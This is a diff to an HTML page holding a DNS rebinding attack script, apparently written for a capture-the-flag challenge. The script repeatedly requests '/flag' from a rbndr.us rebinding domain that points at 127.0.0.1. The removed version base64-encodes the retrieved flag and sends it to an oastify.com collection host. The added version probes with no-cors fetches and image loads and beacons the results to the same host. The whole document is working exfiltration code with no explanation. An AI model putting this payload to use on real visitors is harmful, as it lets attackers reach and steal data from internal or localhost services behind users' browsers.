@@ -1,24 +1,40 @@
 <!DOCTYPE html>
 <html>
-    <head>YOO</head>
+    <head>UPDATED</head>
 <body>
 <script>
 const targetDomain = 'acd918ee.7f000001.rbndr.us';
 
 for (let i = 1; i <= 30; i++) {
     setTimeout(() => {
-        fetch(`http://${targetDomain}/flag`)
-            .then(r => r.text())
-            .then(flag => {
-                const encoded = btoa(flag);
-                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag_success_${i}=${encoded}`;
-                fetch(`https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?fetch_flag_${i}=${encoded}`, {mode: 'no-cors'});
-            })
-            .catch(err => {
-                const encoded = btoa(err.toString());
-                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${i}=${encoded}`;
-                fetch(`https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?fetch_error_${i}=${encoded}`, {mode: 'no-cors'});
-            });
+        fetch(`http://${targetDomain}/flag`, { 
+            mode: 'no-cors',
+            credentials: 'omit'
+        })
+        .then(() => {
+            const data = `Request ${i} completed (no-cors)`;
+            const encoded = btoa(data);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?nocors_${i}=${encoded}`;
+        })
+        .catch(err => {
+            const encoded = btoa(err.toString());
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${i}=${encoded}`;
+        });
+    }, i * 500);
+}
+
+for (let i = 1; i <= 30; i++) {
+    setTimeout(() => {
+        const img = new Image();
+        img.onload = () => {
+            const encoded = btoa(`Image ${i} loaded`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?img_loaded_${i}=${encoded}`;
+        };
+        img.onerror = () => {
+            const encoded = btoa(`Image ${i} failed`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?img_failed_${i}=${encoded}`;
+        };
+        img.src = `http://${targetDomain}/flag?attempt=${i}`;
     }, i * 500);
 }
 </script>
